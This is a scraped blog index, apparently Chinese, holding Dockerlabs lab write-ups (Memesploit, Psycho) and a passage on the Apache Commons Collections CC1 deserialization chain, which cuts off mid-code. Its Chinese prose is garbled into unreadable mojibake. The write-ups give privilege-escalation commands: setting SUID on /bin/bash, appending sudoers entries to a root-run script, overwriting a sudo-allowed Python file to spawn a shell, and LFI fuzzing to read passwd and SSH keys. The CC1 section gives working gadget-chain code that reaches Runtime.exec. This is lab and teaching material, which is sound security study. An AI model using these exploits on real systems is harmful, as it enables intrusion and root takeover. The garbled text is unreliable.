ï¼Œéšåå¯ä»¥è¿›è¡ŒsudoæŸ¥çœ‹å‘½ä»¤ã€‚æœŸé—´æˆ‘å°è¯•è¿‡è¯»å–/root/root.txtå’Œ/root/.ssh/id_rsaç­‰ï¼Œä½†æ˜¯rootç”¨æˆ·å¹¶æ²¡æœ‰é…ç½®sshå¯†é’¥ã€‚å¹¸å¥½åœ¨/optç›®å½•ä¸‹æœ‰ä¸å¯è¯»çš„å¯†ç æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡file**å‘½ä»¤è¯»å–ï¼ŒæˆåŠŸææƒã€‚\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-dancesamba/","section":"Posts","summary":"","title":"Dockerlabs-DanceSamba","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Memesploit â¯ nmap 172.17.0.2 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 19:06 CST\rNmap scan report for 172.17.0.2\rHost is up (0.0000080s latency).\rNot shown: 996 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 13.42 seconds SMB #\r[root@kali] /home/kali/Memesploit â¯ smbclient -L //172.17.0.2/ â\rPassword for [WORKGROUP\\root]:\rSharename Type Comment\r--------- ---- -------\rprint$ Disk Printer Drivers\rshare_memehydra Disk IPC$ IPC IPC Service (c9584cd8853e server (Samba, Ubuntu))\rReconnecting with SMB1 for workgroup listing.\rsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\rProtocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\rUnable to connect with SMB1 -- no workgroup available å­˜åœ¨ä¸€ä¸ªshare_memehydraçš„ç›®å½•ï¼Œä½†æ˜¯å¿…é¡»è¦å¯†ç æ‰èƒ½ç™»å½•ã€‚\nè¿›å…¥ç½‘é¡µå¯ä»¥çœ‹åˆ°æœ‰éƒ¨åˆ†å•è¯è¢«é»‘åŒ–äº†ï¼Œå°è¯•ç”¨å®ƒä½œä¸ºå¯†ç \n[root@kali] /home/kali/Memesploit â¯ enum4linux -a 172.17.0.2 å°è¯•ä½¿ç”¨memehydraä½œä¸ºç”¨æˆ·åç™»å½•æˆåŠŸ\nè§£å‹çš„æ—¶å€™éœ€è¦å¯†ç ï¼Œåˆšå¥½ç½‘é¡µé‡Œçš„å¦ä¸€ä¸ªéšè—å•è¯å°±æ˜¯å¯†ç ã€‚\n[root@kali] /home/kali/Memesploit â¯ unzip secret.zip -d secret\rArchive: secret.zip\r[secret.zip] secret.txt password: inflating: secret/secret.txt [root@kali] /home/kali/Memesploit â¯ cd secret [root@kali] /home/kali/Memesploit/secret â¯ ls\rsecret.txt\r[root@kali] /home/kali/Memesploit/secret â¯ cat secret.txt memesploit:metasploitelmejor sshç™»å½•æ‹¿åˆ°user.txt\nROOT #\ræŸ¥çœ‹ç‰¹æ®Šæƒé™å‘½ä»¤ï¼Œå‘ç°ä¸€ä¸ªservice\nmemesploit@c9584cd8853e:~$ sudo -l\rMatching Defaults entries for memesploit on c9584cd8853e:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser memesploit may run the following commands on c9584cd8853e:\r(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart æ‰¾åˆ°login_monitorçš„ä½ç½®\nå°†å…¶ä¸­ä¸€ä¸ªè„šæœ¬è¿›è¡Œé‡å†™ï¼Œè¿™æ ·é‡å¯çš„æ—¶å€™ä¼šè¢«æ‰§è¡Œ\nè¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼Œä»”ç»†çœ‹è„šæœ¬çš„å†…å®¹ï¼Œéœ€è¦ä¿®æ”¹çš„æ˜¯actionban.sh\nmemesploit@577e1f3f89de:/etc/login_monitor$ cat actionban.sh #!/bin/bash\r# Ruta del archivo que simula el registro de bloqueos\rBLOCK_LOG=\u0026#34;/tmp/block_log.txt\u0026#34;\r# FunciÃ³n para generar una IP aleatoria\rgenerate_random_ip() {\recho \u0026#34;$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))\u0026#34;\r}\r# Generar una IP aleatoria\rIP_TO_BLOCK=$(generate_random_ip)\r# Mensaje de simulaciÃ³n\rMESSAGE=\u0026#34;SimulaciÃ³n de bloqueo de IP: $IP_TO_BLOCK\u0026#34;\r# Mostrar el mensaje en la terminal\recho \u0026#34;$MESSAGE\u0026#34;\r# Registrar el intento de bloqueo en el archivo\recho \u0026#34;$(date): $MESSAGE\u0026#34; \u0026gt;\u0026gt; \u0026#34;$BLOCK_LOG\u0026#34;\recho \u0026#34;El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK\u0026#34; å› ä¸ºè¿™é‡Œçš„**/tmp/block_log.txt**æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè„šæœ¬æ˜¯è¢«æ‰§è¡Œçš„\nmemesploit@577e1f3f89de:/etc/login_monitor$ cp actionban.sh actionban2.sh memesploit@577e1f3f89de:/etc/login_monitor$ rm actionban.sh rm: remove write-protected regular file \u0026#39;actionban.sh\u0026#39;? y memesploit@577e1f3f89de:/etc/login_monitor$ echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; actionban2.sh memesploit@577e1f3f89de:/etc/login_monitor$ mv actionban2.sh actionban.sh memesploit@577e1f3f89de:/etc/login_monitor$ sudo /usr/sbin/service login_monitor restart chmod u+s /bin/bashçš„åŠŸèƒ½ï¼šå½“ç”¨æˆ·æ‰§è¡Œ /bin/bash æ—¶ï¼Œå®ƒä¼šä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½ï¼ˆé€šå¸¸æ˜¯ root ç”¨æˆ·ï¼‰æ‰§è¡Œï¼Œè€Œä¸æ˜¯ä»¥å½“å‰ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ™®é€šç”¨æˆ·æ‰§è¡Œ /bin/bashï¼Œä¼šè·å¾— root æƒé™ï¼Œç›´åˆ°é€€å‡º bashã€‚\nå¦ä¸€ä¸ªè§£æ³•æ˜¯å°†memesploitå†™å…¥è¶…çº§ç”¨æˆ·ç»„ï¼Œç„¶åä½¿ç”¨sudo -iæå‡æƒé™ã€‚å¯ä»¥å‚è€ƒHTB-Sea - HYH\necho \u0026#39;echo \u0026#34;memesploit ALL=(ALL:ALL) ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers.d/memesploit\u0026#39; \u0026gt;\u0026gt; actionban.sh Summary #\rUserï¼šSMBæ–‡ä»¶æ³„éœ²ï¼Œé€šè¿‡ç½‘é¡µä¸­çš„ä¿¡æ¯è¿›è¡Œç™»å½•ä¸‹è½½ï¼Œç„¶åè§£å¯†å‹ç¼©åŒ…ã€‚\nRootï¼šæŸ¥æ‰¾åˆ°**/usr/sbin/service login_monitor restartç›¸å…³çš„è„šæœ¬ï¼Œè¿™é‡Œä¸€å®šè¦æ‰¾å¯¹ï¼Œä¸ç„¶æ²¡æœ‰æ•ˆæœã€‚å¯ä»¥ä¿®æ”¹/bin/bashçš„æ‰§è¡Œæ–¹å¼ï¼Œä¹Ÿå¯ä»¥å°†memesploit**å†™å…¥è¶…çº§ç”¨æˆ·ç»„ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–è§£æ³•ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-memesploit/","section":"Posts","summary":"","title":"Dockerlabs-Memesploit","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 172.17.0.2 -sV Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 15:07 CST\rNmap scan report for 172.17.0.2\rHost is up (0.0000080s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.45 seconds Dirsearch #\r[root@kali] /home/kali/Psycho â¯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3\r(_||| _) (/_(_|| (_| )\rExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Psycho/reports/_172.17.0.2/_25-02-21_15-09-17.txt\rTarget: http://172.17.0.2/\r[15:09:17] Starting: [15:09:18] 403 - 275B - /.ht_wsr.txt [15:09:18] 403 - 275B - /.htaccess.bak1 [15:09:18] 403 - 275B - /.htaccess.orig\r[15:09:18] 403 - 275B - /.htaccess.sample [15:09:18] 403 - 275B - /.htaccess.save\r[15:09:18] 403 - 275B - /.htaccess_extra [15:09:18] 403 - 275B - /.htaccess_sc [15:09:18] 403 - 275B - /.htaccessOLD\r[15:09:18] 403 - 275B - /.htaccessOLD2 [15:09:18] 403 - 275B - /.htm [15:09:18] 403 - 275B - /.html\r[15:09:18] 403 - 275B - /.htaccessBAK\r[15:09:18] 403 - 275B - /.htpasswds [15:09:18] 403 - 275B - /.httr-oauth [15:09:18] 403 - 275B - /.htpasswd_test [15:09:18] 403 - 275B - /.php [15:09:21] 403 - 275B - /.htaccess_orig [15:09:24] 301 - 309B - /assets -\u0026gt; http://172.17.0.2/assets/ [15:09:24] 200 - 458B - /assets/ [15:09:38] 403 - 275B - /server-status [15:09:38] 403 - 275B - /server-status/ Task Completed åœ¨ç½‘é¡µæºç åº•éƒ¨å‘ç°äº†ä¸€ä¸ªERRORï¼Œæ„å‘³ç€æ˜¯ä¸æ˜¯ä»–çš„è°ƒç”¨æ–¹å¼æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿæˆ–è€…ä»€ä¹ˆå‚æ•°æœ‰é—®é¢˜ï¼Ÿ\nFFUF #\rå°è¯•å¯¹index.phpçš„å‚æ•°è¿›è¡Œæšä¸¾ï¼Œå‘ç°å­˜åœ¨secretè¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥è¿›è¡ŒLFIè¯»å–æ–‡ä»¶\n[root@kali] /home/kali â¯ ffuf -w ./Desktop/fuzzDicts/paramDict/parameter.txt -u \u0026#39;http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd\u0026#39; --fs 2596\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://172.17.0.2/index.php?FUZZ=../../../../../../etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/parameter.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 2596\r________________________________________________\rsecret [Status: 200, Size: 3870, Words: 678, Lines: 89, Duration: 0ms]\r:: Progress: [5846/5846] :: Job [1/1] :: 57 req/sec :: Duration: [0:00:04] :: Errors: 0 :: ç”¨curlå‘é€å‘½ä»¤ç„¶åè·å–åˆ°äº†**/etc/passwd**çš„å†…å®¹\nè¿™é‡Œå‘ç°äº†ä¸¤ä¸ªç”¨æˆ·åï¼švaxeiã€luisillo\nå°è¯•è¯»å–sshå¯†é’¥æ–‡ä»¶\næˆåŠŸæ‹¿åˆ°vaxeiç”¨æˆ·çš„shellï¼Œç”¨LFIæ— æ³•è¯»å–åˆ°luisilloçš„sshå¯†é’¥\nPrivilege Escalation #\ræŸ¥çœ‹ç”¨æˆ·çš„ç‰¹æ®Šæƒé™å‘½ä»¤\nå¯ä»¥å‘ç°vaxeièƒ½ä»¥luisilloçš„èº«ä»½è¿è¡Œperlå‘½ä»¤\nvaxei@4b3a9fd95001:~$ sudo -l\rMatching Defaults entries for vaxei on 4b3a9fd95001:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser vaxei may run the following commands on 4b3a9fd95001:\r(luisillo) NOPASSWD: /usr/bin/perl åœ¨perl | GTFOBinsä¸­å¯ä»¥çœ‹åˆ°\nå› æ­¤å¯ä»¥å°†ç”¨æˆ·æå‡ä¸ºluisillo\næŸ¥çœ‹luisilloçš„ç‰¹æ®Šå‘½ä»¤\nluisillo@4b3a9fd95001:~$ sudo -l\rMatching Defaults entries for luisillo on 4b3a9fd95001:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser luisillo may run the following commands on 4b3a9fd95001:\r(ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py æŸ¥çœ‹**/opt/paw.py**çš„å…·ä½“å†…å®¹\nluisillo@4b3a9fd95001:~$ cat /opt/paw.py import subprocess\rimport os\rimport sys\rimport time\r# F\rdef dummy_function(data):\rresult = \u0026#34;\u0026#34;\rfor char in data:\rresult += char.upper() if char.islower() else char.lower()\rreturn result\r# CÃ³digo para ejecutar el script\ros.system(\u0026#34;echo Ojo Aqui\u0026#34;)\r# SimulaciÃ³n de procesamiento de datos\rdef data_processing():\rdata = \u0026#34;This is some dummy data that needs to be processed.\u0026#34;\rprocessed_data = dummy_function(data)\rprint(f\u0026#34;Processed data: {processed_data}\u0026#34;)\r# SimulaciÃ³n de un cÃ¡lculo inÃºtil\rdef perform_useless_calculation():\rresult = 0\rfor i in range(1000000):\rresult += i\rprint(f\u0026#34;Useless calculation result: {result}\u0026#34;)\rdef run_command():\rsubprocess.run([\u0026#39;echo Hello!\u0026#39;], check=True)\rdef main():\r# Llamadas a funciones que no afectan el resultado final\rdata_processing()\rperform_useless_calculation()\r# Comando real que se ejecuta\rrun_command()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain() å…¶å®è¿™é‡Œæœ‰å¾ˆå¤šç§è§£æ³•ï¼Œæˆ‘å°±å†™ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ã€‚\nluisilloæ˜¯å¯ä»¥åœ¨**/opt/**ç›®å½•ä¸‹è¿›è¡Œä»»æ„æ“ä½œçš„ï¼ŒåŒ…æ‹¬åˆ é™¤æ–‡ä»¶ï¼Œæ·»åŠ æ–‡ä»¶\nå› æ­¤å¯ä»¥é‡å†™è¿™ä¸ªpaw.py\nluisillo@4b3a9fd95001:/opt$ rm paw.py\rluisillo@4b3a9fd95001:/opt$ echo \u0026#39;import os; os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026gt;\u0026gt; paw.py ç„¶åæ‰§è¡Œå³å¯æ‹¿åˆ°rootæƒé™\nå…¶ä½™çš„è§£æ³•æˆ‘çœ‹äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚ä¹Ÿå°±æ˜¯ä¿®æ”¹å¼•å…¥åŒ…ï¼Œå› ä¸ºpythonçš„å¼•å…¥åŒ…ç­–ç•¥æ˜¯åŒçº§ç›®å½•ä¼˜å…ˆï¼Œå¦‚æœç»Ÿè®¡ç›®å½•ä¸‹æœ‰subprocess.pyè¿™ç§ï¼Œä¼šä¼˜å…ˆä½¿ç”¨å®ƒã€‚å¦‚æœå°†å‘½ä»¤å†™å…¥ï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è·å–åˆ°rootæƒé™ã€‚è¿™ç§åœ¨æ— æ³•ä¿®æ”¹paw.pyçš„æƒ…å†µä¸‹æ˜¯å¯ä»¥ä½¿ç”¨çš„\nSummary #\rä»ç½‘é¡µæºç çŒœæµ‹å¾—åˆ°ï¼Œå­˜åœ¨LFIæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨wfuzzå¯¹è·¯å¾„å‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œè¯»å–vaxeiçš„sshå¯†é’¥æˆåŠŸæ‹¿åˆ°Shellæƒé™ã€‚åˆ©ç”¨vaxeiä½œä¸ºè·³æ¿å¾—åˆ°luisilloçš„æƒé™ï¼Œå¹¶ä¸”é€šè¿‡è¦†å†™paw.pyæˆåŠŸè¶Šæƒ\nç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªé¶åœº, ä½¿ç”¨dockeræ­åœ¨æœ¬åœ°çš„è¯,æ“ä½œèµ·æ¥å°±æ¯”è¾ƒæ–¹ä¾¿,ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå»¶è¿Ÿ\n","date":"2025-02-21","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-psycho/","section":"Posts","summary":"","title":"DockerLabs-Psycho","type":"posts"},{"content":"\rAbout #\ræœ¬æ–‡æ˜¯å…³äºApache commons collectionsååºåˆ—æ¼æ´åˆ©ç”¨é“¾çš„è¿‡ç¨‹å¤ç°\nEnvironment #\rJDK version jdk-8u65-windows-x64 Common collections version 3.2.1 Java Archive Downloads - Java SE 8\noracle.com passwords - BugMeNot. (å¦‚æœä¸‹è½½JDKéœ€è¦ç™»å½•ï¼Œè¿™é‡Œæ˜¯å…è´¹çš„è´¦æˆ·)\njdk8u/jdk8u/jdk: af660750b2f4 (æºä»£ç ä¸‹è½½)\nMavenå¯¼å…¥3.2.1ç‰ˆæœ¬\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; CC1é“¾åœ¨JDK 8u71åŠä¹‹åçš„ç‰ˆæœ¬ä¸­è¢«ä¿®å¤\nInvokerTransformer#transform #\rCC1é“¾é€ æˆçš„åŸå› æ˜¯Transformerçš„transformæ–¹æ³•\nå¯ä»¥çœ‹åˆ°transformæ–¹æ³•ä½¿ç”¨input.getClass()è·å–è¾“å…¥å¯¹è±¡çš„ç±»ï¼Œç„¶åé€šè¿‡cls.getMethod(iMethodName, iParamTypes)è·å–ç±»ä¸­åä¸ºiMethodNameä¸”å‚æ•°ç±»å‹ä¸ºiParamTypesçš„æ–¹æ³•ã€‚\nå…¶ä¸­iMethodNameç­‰å‚æ•°åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°±ä»¥å®å‚çš„å½¢å¼æŒ‡å®šäº†ï¼Œé€šè¿‡ç›´æ¥å®ä¾‹åŒ–InvokerTransformerï¼Œå¹¶ä¸”è®©transformçš„ä¼ å…¥å¯¹è±¡ä¸ºRuntimeå³å¯æˆåŠŸè°ƒç”¨åˆ°execï¼Œå…·ä½“å¦‚ä¸‹ä»£ç \nimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.IOException;\rpublic class CC1TEST {\r@Test\rpublic void Test() throws IOException {\rInvokerTransformer invokerTransformer= new InvokerTransformer(\r\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;});\rinvokerTransformer.transform(Runtime.getRuntime());\r}\r} TransformedMap#checkSetValue #\ræŸ¥æ‰¾transformçš„å®ç°ï¼Œæ‰¾åˆ°TransformedMapé‡Œæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯å‰ç¼€æ˜¯protectedï¼Œä¹Ÿå°±æ— æ³•å¤–éƒ¨è°ƒç”¨\nç»§ç»­å‘ä¸Šå¯»æ‰¾ï¼Œå‘ç°å¦ä¸€ä¸ªå‡½æ•°setValueé€šè¿‡å¤–éƒ¨ä¼ å‚é—´æ¥è°ƒç”¨äº†checkSetValueï¼Œå¹¶ä¸”å¯ä»¥æ˜¾å¼è°ƒç”¨\nåœ¨TransformedMapçš„decorateä¸­å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªé™æ€å‡½æ•°ï¼Œå¹¶ä¸”å¯ä»¥ä¼ å…¥å‚æ•°ç”Ÿæˆä¸€ä¸ªæ–°çš„å®ä¾‹ã€‚\nç”±äºTransformedMapæ˜¯ç»§æ‰¿äºAbstractInputCheckedMapDecoratorï¼Œå› æ­¤å¯ä»¥ç›´æ¥å¤–éƒ¨è°ƒç”¨setvalueå‡½æ•°ã€‚Map.Entry.setValueæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ›´æ–°æ˜ å°„ä¸­å€¼çš„æ–¹æ³•ã€‚\nç°åœ¨çš„æ€è·¯å°±æ˜¯ï¼šé€šè¿‡ä½¿ç”¨TransformedMapçš„decorateé™æ€å‡½æ•°ç”Ÿæˆä¸€ä¸ªTransformedMapçš„å¯¹è±¡ï¼Œå¹¶ä¸”æå‡ä¸ºçˆ¶ç±»Mapï¼Œå› ä¸ºsetValueåªåœ¨Mapç±»ä¸­æœ‰ï¼Œå­ç±»ä¸­å¹¶æ²¡æœ‰å®šä¹‰ã€‚é€šè¿‡è¿™ä¸ªå¯¹è±¡çš„checkSetValueæ–¹æ³•åˆ°setValueæ–¹æ³•ï¼Œæœ€ååˆ°transformæ–¹æ³•ï¼ˆå…¶ä¸­çš„å‚æ•°æ˜¯ç›¸åŒçš„ï¼‰ã€‚\nimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport org.junit.Test;\rimport java.util.HashMap;\rimport java.util.Map;\rpublic class CC1TEST {\r@Test\rpublic void Test() {\rInvokerTransformer invokerTransformer = new InvokerTransformer(\r\u0026#34;exec\u0026#34;,\rnew Class[]{String.class},\rnew Object[]{\u0026#34;calc\u0026#34;});\rHashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;();\rmap.put(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;);\rMap\u0026lt;Object,Object\u0026gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);\rdecorated.entrySet().forEach(entry -\u0026gt; {\rentry.setValue(Runtime.getRuntime()) ;\r});\r}\r} AnnotationInvocationHandler #\rè¿™ä¸ªç±»å®ç°äº†Serializableæ¥å£ï¼Œå› æ­¤å¯ä»¥è¢«åºåˆ—åŒ–\nå¹¶ä¸”åœ¨å…¶readObjectæ–¹æ³•ä¸­å­˜åœ¨setValueæ–¹æ³•çš„è°ƒç”¨\nå› æ­¤è¿™ä¸ªç±»å¯ä»¥ä½œä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹\nä½†æ˜¯å®ƒä¸èƒ½è¢«æ˜¾å¼åˆ›å»ºå®ä¾‹ï¼Œåªèƒ½ä½¿ç”¨åå°„è¿›è¡Œåˆ›å»º\nClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);\rdeclaredConstructor.setAccessible(true);\rObject o = declaredConstructor.newInstance(Target.class, decorated); å›åˆ°readObjcetæ–¹æ³•ï¼Œæ‰§è¡Œåˆ°setValueæ–¹æ³•ä¹‹å‰æœ‰ä¸¤ä¸ªåˆ¤æ–­ï¼Œç»•è¿‡ä¹Ÿéå¸¸ç®€å•ï¼Œåªéœ€è¦ä¼ å…¥çš„mapä¸­æœ‰é”®å€¼å¯¹å°±è¡Œ\nprivate void readObject(java.io.ObjectInputStream s)\rthrows java.io.IOException, ClassNotFoundException {\rs.defaultReadObject();\r// Check to make sure that types have not evolved incompatibly\rAnnotationType annotationType = null;\rtry {\rannotationType = AnnotationType.getInstance(type);\r} catch(IllegalArgumentException e) {\r// Class is no longer an annotation type; time to punch out\rthrow new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;);\r}\rMap\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes();\r// If there are annotation members without values, that\r// situation is handled by the invoke method.\rfor (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) {\rString name = memberValue.getKey();\rClass\u0026lt;?\u0026gt; memberType = memberTypes.get(name);\rif (memberType != null) { // i.e. member still exists\rObject value = memberValue.getValue();\rif (!(memberType.isInstance(value) ||\rvalue instanceof ExceptionProxy)) {\rmemberValue.setValue(\rnew AnnotationTypeMismatchExceptionProxy(\rvalue.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember(\rannotationType.members().get(name)));\r}\r}\r}\r} ä½†æ˜¯ï¼Œå°±ç®—ç»•è¿‡äº†å‰é¢çš„åˆ¤æ–­ï¼Œè¿™é‡Œçš„memberValueçš„setValueæ–¹æ³•å‚æ•°ä»ç„¶æ˜¯ä¸å¯æ§çš„ï¼Œä¹Ÿå°±æ— æ³•è®¾ç½®å‚æ•°ä¸ºRuntime\nChainedTransformer #\rå¯ä»¥çœ‹åˆ°æ•´ä¸ªç±»çš„transformæ–¹æ³•æ˜¯æˆé“¾å¼ç»“æ„çš„ï¼Œä¸Šä¸€ä¸ªç»è¿‡transformçš„å¯¹è±¡ä¼šä½œä¸ºä¸‹ä¸€è½®çš„å‚æ•°\nå› æ­¤å¯ä»¥å°†decorateçš„å‚æ•°æŒ‡å®šä¸ºä¸€ä¸ªChainedTransformerï¼Œå½“å…¶è§¦å‘setValueçš„æ—¶å€™å…¶ä¸­çš„å¯¹è±¡ä¼šä¸€å±‚ä¸€å±‚çš„ä¼ é€’ï¼Œç›´åˆ°Runtimeçš„execæ–¹æ³•è¢«æ‰§è¡Œ\nå› æ­¤ä»£ç ç»“æ„å¯ä»¥å¦‚ä¸‹ï¼Œç”±äºRuntimeæ˜¯æ— æ³•è¢«ç›´æ¥å®ä¾‹åŒ–çš„ï¼Œå› æ­¤è¿™é‡Œé“¾æ¡çš„ç¬¬ä¸€ä¸ªæ˜¯ä½¿ç”¨çš„ConstantTransformerï¼Œè¿™ä¸ªç±»çš„transformæ–¹æ³•è¾“å…¥å’Œè¾“å‡ºçš„ä¸€è‡´çš„ï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°Runtimeçš„Classã€‚\nä¹‹åä½¿ç”¨InvokerTransformerè§¦å‘getMethodæ–¹æ³•ï¼Œéšåæ— å‚æ•°è°ƒç”¨invokeè·å–åˆ°getRuntimeä»è€Œè¿›è¡Œå®ä¾‹åŒ–å¾—åˆ°ä¸€ä¸ªRuntimeå¯¹è±¡ã€‚\næœ€åç»è¿‡è¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡è°ƒç”¨execæ–¹æ³•ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nimport org.apache.commons.collections.Transformer;\rimport org.apache.commons.collections.functors.ChainedTransformer;\rimport org.apache.commons.collections.functors.ConstantTransformer;\rimport org.apache.commons.collections.functors.InvokerTransformer;\rimport org.apache.commons.collections.map.TransformedMap;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.annotation.Target;\rimport java.lang.reflect.Constructor;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.HashMap;\rimport java.util.Map;\rpublic class CC1TEST {\r@Test\rpublic void Test() throws Exception {\rChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\rnew ConstantTransformer(Runtime.class),\rnew InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class,Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;,null}),\rnew InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class,Object[].class}, new Object[]{null,null }),\rnew InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;})\r});\rHashMap\u0026lt;Object, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;();\rmap.put(\u0026#34;value\u0026#34;, \u0026#34;value\u0026#34;);\rMap\u0026lt;Object,Object\u0026gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);\rClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;);\rConstructor\u0026lt;?\u0026gt; declaredConstructor = 